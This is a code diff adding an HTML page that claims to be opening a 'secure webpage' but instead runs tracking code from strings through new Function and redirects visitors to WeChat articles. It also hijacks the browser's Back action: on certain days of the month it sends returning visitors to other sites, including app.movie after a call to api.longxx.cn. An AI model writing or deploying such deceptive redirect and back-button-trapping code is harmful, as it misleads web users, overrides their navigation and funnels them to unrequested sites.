@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>
+	</title>
+	<style>
+        * {padding: 0;margin: 0;}html,body {width: 100%;height: 100%;}.box {text-align:
+                center;height: 100vh;line-height: 100vh;font-size: 5vw;}
+	</style>
+</head>
+<body>
+<div class="box">
+	正在打开安全网页,请稍等...
+</div>
+
+<script>
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?67aa5a134aba2d63e0fa781526e3a651";
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+<script>
+
+
+    var url_arr = [
+        'http://upread.ccdy.cn/show.html?c=24EAF84A',
+        'http://upread.ccdy.cn/show.html?c=24EAF84A',
+
+    ];
+
+    var tz_arr = [
+        //luori
+        {url: 'http://mp.weixin.qq.com/s?__biz=MzU3ODc1NDQxMA==&mid=100000428&idx=1&sn=66f2d11111c70c96a0dc9d23608ed576&chksm=7d71c0a94a0649bf8add6c2f4f158a5a47f5328cec9dc96bc0a9b19b8a361602eff3060c8ea6#rd', count: 'var _hmt = _hmt || [];\n' +
+                '(function() {\n' +
+                '  var hm = document.createElement("script");\n' +
+                '  hm.src = "https://hm.baidu.com/hm.js?4fd97415e60700fac2022559a35daab3";\n' +
+                '  var s = document.getElementsByTagName("script")[0]; \n' +
+                '  s.parentNode.insertBefore(hm, s);\n' +
+                '})();'},
+        //nayu
+        // {url: 'http://mp.weixin.qq.com/s?__biz=MzkwNzEzMzc5MQ==&mid=100000011&idx=1&sn=54f947933d3d2a85577572d2767d4616&chksm=40dc973b77ab1e2d8e8e266aaaa778a4ba8f1ed7758a5a09660e8d2d99de1b8acee4a689ac9a#rd', count: 'var _hmt = _hmt || [];\n' +
+        //         '(function() {\n' +
+        //         '  var hm = document.createElement("script");\n' +
+        //         '  hm.src = "https://hm.baidu.com/hm.js?877a0c6a36d7a541a480ce736867c3ec";\n' +
+        //         '  var s = document.getElementsByTagName("script")[0]; \n' +
+        //         '  s.parentNode.insertBefore(hm, s);\n' +
+        //         '})();'},
+        //muji
+        // {url: 'http://mp.weixin.qq.com/s?__biz=Mzg5MTQ1MzI1OQ==&mid=100000011&idx=1&sn=1395b7685e706e23b1136ee779419324&chksm=4fcc6b2f78bbe239210682e9b37349c0e580b33ba7c1b246db33345f169f3c1bc21da3330f01#rd', count: 'var _hmt = _hmt || [];\n' +
+        //         '(function() {\n' +
+        //         '  var hm = document.createElement("script");\n' +
+        //         '  hm.src = "https://hm.baidu.com/hm.js?eaea322d0400d43b106ae32734e6fbd2";\n' +
+        //         '  var s = document.getElementsByTagName("script")[0]; \n' +
+        //         '  s.parentNode.insertBefore(hm, s);\n' +
+        //         '})();'},
+        //gulou
+        {url: 'http://mp.weixin.qq.com/s?__biz=MzU2NTg3NzQ1OQ==&mid=100000141&idx=1&sn=ca9d4bf581562072f1e18d15f65f007c&chksm=7cb44e314bc3c727a3a11927bb88cd87a8fee35f9bdfc446bee6c8233c517c04c8a75dc994e7#rd', count: 'var _hmt = _hmt || [];\n' +
+                '(function() {\n' +
+                '  var hm = document.createElement("script");\n' +
+                '  hm.src = "https://hm.baidu.com/hm.js?61c125465009937fd60bd2834d2676e3";\n' +
+                '  var s = document.getElementsByTagName("script")[0]; \n' +
+                '  s.parentNode.insertBefore(hm, s);\n' +
+                '})();'},
+    ];
+
+    var tzSingle = makeRandomArr(tz_arr, 1)
+    if (sessionStorage.getItem('xcxCount') != 1){
+        new Function(tzSingle[0].count)()
+    }
+
+    window.addEventListener('pageshow', function () {
+        if (sessionStorage.getItem('xcxCount') == 1){
+            if (new Date().getDate() == 9) {
+                location.href = makeRandomArr(url_arr, 1) // 退弹
+            }
+
+            if (new Date().getDate() == 10) {
+                var ajax = new XMLHttpRequest();
+                ajax.open('get', 'http://api.longxx.cn/bak/gg/api/api_gg.php?zf2fan');
+                ajax.send();
+                ajax.onreadystatechange = function () {
+                    if (ajax.readyState==4 &&ajax.status==200) {
+                        var data = JSON.parse(ajax.responseText)
+                        // location.href = data.domainname
+                        location.href = 'https://app.movie'
+                    }
+                }
+            }
+        } else {
+            sessionStorage.setItem('xcxCount', 1)
+            location.href = tzSingle[0].url// 跳转
+        }
+    });
+
+    function makeRandomArr(arrList, num) { // 随机取出数组元素
+        if (num > arrList.length) {
+            num = arrList.length // eslint-disable-line
+        }
+        var tempArr = arrList.slice(0)
+        var newArrList = []
+        for (var i = 0; i < num; i++) {
+            var random = Math.floor(Math.random() * (tempArr.length))
+            var arr = tempArr[random]
+            tempArr.splice(random, 1)
+            newArrList.push(arr)
+        }
+        return newArrList
+    }
+</script>
+</body>
+</html>
